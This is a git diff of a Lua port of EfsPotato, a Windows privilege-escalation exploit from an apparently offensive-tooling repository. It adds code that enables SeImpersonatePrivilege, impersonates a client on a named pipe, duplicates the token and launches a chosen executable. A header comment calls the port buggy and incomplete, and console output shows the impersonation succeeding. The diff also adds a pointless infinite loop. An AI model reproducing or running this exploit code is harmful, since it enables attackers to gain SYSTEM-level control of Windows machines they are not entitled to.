@@ -1,19 +1,22 @@
---[[ PS C:\Users\Fantastic\Desktop\Sayuri\PrivFu\ArtsOfGetSystem\EfsPotato\obj\Debug> .\EfsPotato.exe -i -c cmd.exe
-
-[>] Trying to create named pipe.
+--[[ efspotato in Lua, this is converted from C# and currently creates a named pipe, duplicates the token and then spawns a process.
+This all seems to work but cmd.exe then immediately quits, probably due to naunces in the CreateProcessWithTokenW() or CreateProcessAsUserA()
+calls. Triggering this issue is also not achieved here as there is no multi-threading in lua, just concurrency so we need a separate lua thread
+to call the trigger or a different trigger script. This was written as an exercise to see if it could be done and is almost there but has
+many bugs. 
+    
+PS C:\Users\Fantastic\source\repos\OffensiveLua> .\luajit.exe .\efspotato.lua
+createNamedPipe called with \\.\pipe\cb9c1a5b-6910-4fb2-b457-a9c72a392d90\pipe\srvsvc
 [+] Named pipe is created successfully.
-    [*] Path : \\.\pipe\{1306D9C6-4BAE-4527-9F0B-75B32A74E054}\pipe\srvsvc
-[>] Waiting for named pipe connection.
-[>] Calling EfsRpcEncryptFileSrv().
-    [*] Target File Path   : \\localhost/pipe/{1306D9C6-4BAE-4527-9F0B-75B32A74E054}\C$\PrivFu.txt
-    [*] Endpoint Pipe Name : \pipe\efsrpc
+    [*] Path : \\.\pipe\cb9c1a5b-6910-4fb2-b457-a9c72a392d90\pipe\srvsvc
+[+] Waiting for named pipe connection.
 [+] Got named pipe connection.
-[+] Named pipe impersonation is successful (SID: S-1-5-18).
-[+] SYSTEM process is executed successfully (PID = 28224).
-Microsoft Windows [Version 10.0.22621.2715]
-(c) Microsoft Corporation. All rights reserved.
+[+] Named pipe impersonation is successful
+[+] Process with user token is executed successfully (PID = 0).
 
-C:\Users\Fantastic\Desktop\Sayuri\PrivFu\ArtsOfGetSystem\EfsPotato\obj\Debug>
+The command immediately exits, but has executed.  You can trigger with EfsPotato.exe from C# project.
+
+PS C:\Users\Fantastic\Desktop\Sayuri\PrivFu\ArtsOfGetSystem\EfsPotato\obj\Debug> .\EfsPotato.exe -i -c cmd.exe
+
 ]] --
 
 -- Load the FFI library for Windows API
@@ -35,12 +38,15 @@ typedef uint32_t UINT;
 typedef int64_t LARGE_INTEGER;
 typedef uint32_t ULONG;
 typedef uint32_t ULONG_PTR;
+typedef long LONG;
+typedef DWORD* PDWORD;
 typedef uint16_t WORD;
 typedef void* LPBYTE;
 typedef int NTSTATUS;
 typedef wchar_t WCHAR;
 typedef const wchar_t* LPCWSTR;
-typedef wchar_t* LPWSTR;
+typedef wchar_t WCHAR;
+typedef WCHAR* LPWSTR;
 typedef const char* LPCSTR;
 
 enum ACCESS_MASK {
@@ -73,6 +79,22 @@ typedef struct {
     } DUMMYUNIONNAME;
     HANDLE hEvent;
 } OVERLAPPED;
+
+typedef struct _LUID {
+    DWORD LowPart;
+    LONG HighPart;
+} LUID, *PLUID;
+  
+typedef struct _LUID_AND_ATTRIBUTES {
+    LUID Luid;
+    DWORD Attributes;
+} LUID_AND_ATTRIBUTES, *PLUID_AND_ATTRIBUTES;
+  
+typedef struct _TOKEN_PRIVILEGES {
+    DWORD PrivilegeCount;
+    LUID_AND_ATTRIBUTES Privileges[1];
+} TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;
+
 
 typedef struct _STARTUPINFO {
     DWORD  cb;
@@ -134,6 +156,9 @@ int OpenProcessToken(
     HANDLE* TokenHandle
 );
 int GetCurrentProcessId();
+BOOL OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, HANDLE* TokenHandle);
+BOOL LookupPrivilegeValueA(const char* lpSystemName, const char* lpName, PLUID lpLuid);
+BOOL AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
 
 HANDLE CreateProcessAsUserA(
     HANDLE hToken,
@@ -163,6 +188,8 @@ local CREATE_NEW_CONSOLE = 0x00000010
 local EVENT_ALL_ACCESS = 0x1F0003
 local CREATE_EVENT_MANUAL_RESET = 0x0001
 local CREATE_EVENT_INITIAL_STATE = 0x0002
+local TOKEN_ADJUST_PRIVILEGES = 0x0020
+local SE_PRIVILEGE_ENABLED = 0x00000002
 
 -- endpoint pipe name
 local endpointPipeName = "efsrpc"
@@ -219,9 +246,29 @@ local sessionId = 0
 local interactive = true
 
 -- Function to enable token privileges (You need to implement this function)
-local function enableTokenPrivileges()
+local function enableTokenPrivileges(privilege)
     -- Implement this function using the C APIs
     -- You will need to retrieve the current process token, adjust privileges, etc.
+    local tokenHandle = ffi.new("HANDLE[1]")
+    local luid = ffi.new("LUID[1]")
+    local newState = ffi.new("TOKEN_PRIVILEGES")
+
+    if advapi32.OpenProcessToken(ffi.C.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, tokenHandle) == 0 then
+        return false
+    end
+
+    if advapi32.LookupPrivilegeValueA(nil, privilege, luid) == 0 then
+        return false
+    end
+
+    newState.PrivilegeCount = 1
+    newState.Privileges[0].Luid = luid[0]
+    newState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+
+    if advapi32.AdjustTokenPrivileges(tokenHandle[0], false, newState, 0, nil, nil) == 0 then
+        return false
+    end
+    print("[-] Set privilege " .. privilege .. " successfully");
     return true;
 end
 
@@ -284,6 +331,31 @@ local function duplicateCurrentToken()
     return hToken[0]
 end
 
+
+--[[ Function to create a process with a token using CreateProcessWithTokenW
+local function createProcessWithToken(hToken, command, startupInfo, processInformation)
+    if advapi32.CreateProcessWithTokenW(
+        hToken,
+        0x1, -- Logon Flags, 0 for default
+        nil,
+        ffi.cast("LPSTR", command),
+        0, -- Creation Flags, you can customize this based on your needs
+        nil,
+        nil,
+        startupInfo,
+        processInformation
+    ) == 0 then
+        local error = ffi.C.GetLastError()
+        print("[-] Failed to spawn process with user token.")
+        print("    |-> Error: " .. error)
+        return false
+    else
+        print("[+] Process with user token is executed successfully (PID = " .. processInformation.dwProcessId .. ").")
+        return true
+    end
+end
+]]--
+
 -- Function to create a process with a token
 local function createProcessWithToken(hToken, command, startupInfo, processInformation)
     local lpCommandLine = ffi.cast("LPSTR", command)
@@ -294,7 +366,7 @@ local function createProcessWithToken(hToken, command, startupInfo, processInfor
         nil,
         nil,
         false,
-        0, -- Flags, you can customize this based on your needs
+        0x01000000, -- Flags, you can customize this based on your needs
         nil,
         ffi.NULL,
         startupInfo,
@@ -328,7 +400,10 @@ local function GetSystem(command, endpointPipeName)
     end
 
     -- Enable necessary token privileges (You need to implement this function)
-    if not enableTokenPrivileges() then
+    if not enableTokenPrivileges("SeImpersonatePrivilege") then
+        return false
+    end
+    if not enableTokenPrivileges("SeIncreaseQuotaPrivilege") then
         return false
     end
 
@@ -356,9 +431,11 @@ local function GetSystem(command, endpointPipeName)
     if hPipe then
         ffi.C.CloseHandle(hPipe)
     end
-
+    while true do
+        a = 1 + 1
+    end
     print("[*] Done.")
 end
 
 -- Call the GetSystem function
-GetSystem("calc.exe", "efsrpc")
+GetSystem("c:\\Users\\Fantastic\\Desktop\\DEMO\\Renge_x64.exe", "efsrpc")
